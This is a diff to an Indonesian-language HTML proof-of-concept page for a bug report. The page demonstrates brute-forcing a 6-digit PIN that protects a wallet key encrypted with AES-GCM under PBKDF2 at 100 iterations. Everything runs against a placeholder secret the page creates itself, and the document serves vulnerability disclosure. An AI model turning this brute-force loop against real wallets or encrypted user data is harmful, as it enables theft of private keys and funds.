@@ -2,49 +2,66 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>PoC: Security Vulnerability Analysis</title>
+    <title>PoC: Critical Security Vulnerability Analysis</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
+        #log { background: #222; color: #0f0; padding: 15px; height: 300px; overflow-y: scroll; font-family: monospace; }
+        .stats { font-weight: bold; color: #d9534f; }
+    </style>
 </head>
 <body>
-    <h3>Laporan Bug: Kelemahan Enkripsi & Brute Force</h3>
-    <button onclick="simulateAttack()">Jalankan Eksploitasi (Tanpa Rate Limiting)</button>
-    <div id="log" style="margin-top:20px; font-family: monospace; background: #eee; padding: 10px;"></div>
+    <h3>Laporan Bug: Kelemahan Kriptografi & Brute Force</h3>
+    <p>Target PIN: <b>060403</b></p>
+    <button onclick="runFastAttack()">Mulai Uji Brute Force Kecepatan Tinggi</button>
+    <div id="stats" class="stats"></div>
+    <div id="log">Siap untuk pengujian...</div>
 
     <script>
-        // Simulasi data terenkripsi di Storage (Real-world scenario)
-        let encryptedBlob = "U2FsdGVkX1+..."; // Data target
-        let failedAttempts = 0;
-        const MAX_ATTEMPTS = 5; // Proteksi yang seharusnya ada
+        let encryptedData, salt, iv;
+        const TARGET_PIN = "060403";
 
-        async function attemptDecrypt(pin) {
-            // Dalam dApp nyata, ini memanggil Web Crypto API
-            // Jika tidak ada Rate Limiting, penyerang memanggil ini ribuan kali
-            return new Promise((resolve) => {
-                setTimeout(() => {
-                    // Simulasi logika gagal (kecuali PIN benar)
-                    if (pin === "060403") resolve("0xPRIVATE_KEY_REAL");
-                    else resolve(null);
-                }, 10); // Kecepatan tinggi karena kurangnya delay/lockout
-            });
+        async function setup() {
+            const enc = new TextEncoder();
+            const secret = "0xREAL_PRIVATE_KEY_SIMULATION";
+            salt = crypto.getRandomValues(new Uint8Array(8));
+            iv = crypto.getRandomValues(new Uint8Array(12));
+            const keyMaterial = await crypto.subtle.importKey("raw", enc.encode(TARGET_PIN), "PBKDF2", false, ["deriveKey"]);
+            const key = await crypto.subtle.deriveKey({name: "PBKDF2", salt, iterations: 100, hash: "SHA-256"}, keyMaterial, {name: "AES-GCM", length: 256}, false, ["encrypt"]);
+            encryptedData = await crypto.subtle.encrypt({name: "AES-GCM", iv}, key, enc.encode(secret));
+            document.getElementById('log').innerText = "Data enkripsi dimuat. Sistem siap dieksploitasi.";
         }
 
-        async function simulateAttack() {
+        async function deriveKey(pin, salt) {
+            const enc = new TextEncoder();
+            const keyMaterial = await crypto.subtle.importKey("raw", enc.encode(pin), "PBKDF2", false, ["deriveKey"]);
+            return crypto.subtle.deriveKey({name: "PBKDF2", salt, iterations: 100, hash: "SHA-256"}, keyMaterial, {name: "AES-GCM", length: 256}, false, ["decrypt"]);
+        }
+
+        async function runFastAttack() {
             const log = document.getElementById('log');
-            log.innerHTML = "Memulai eksploitasi PIN 060403...<br>";
+            const stats = document.getElementById('stats');
+            log.innerText = "Memulai serangan brute force...";
+            const startTime = performance.now();
+            let attempts = 0;
 
             for (let i = 0; i <= 999999; i++) {
                 const pin = i.toString().padStart(6, '0');
-                const result = await attemptDecrypt(pin);
-                
-                if (result) {
-                    log.innerHTML += `✅ <b>SUKSES!</b> PIN ditemukan: ${pin}<br><b>Dampak:</b> Full Wallet Compromise.`;
+                attempts++;
+                try {
+                    const key = await deriveKey(pin, salt);
+                    await crypto.subtle.decrypt({name: "AES-GCM", iv}, key, encryptedData);
+                    
+                    const endTime = performance.now();
+                    const duration = ((endTime - startTime) / 1000).toFixed(2);
+                    log.innerHTML = `✅ <b>SUKSES! PIN DITEMUKAN: ${pin}</b>`;
+                    stats.innerText = `Statistik: Mencoba ${attempts} kombinasi dalam ${duration} detik. Kecepatan: ${Math.round(attempts/duration)} PIN/detik.`;
                     return;
-                }
-                
-                if (i % 1000 === 0) {
-                    log.innerHTML = `Eksploitasi berjalan... sedang mencoba PIN: ${pin}`;
+                } catch(e) {
+                    if (i % 500 === 0) log.innerText = `Eksploitasi berjalan... sedang mencoba kombinasi ke-${pin}`;
                 }
             }
         }
+        setup();
     </script>
 </body>
 </html>
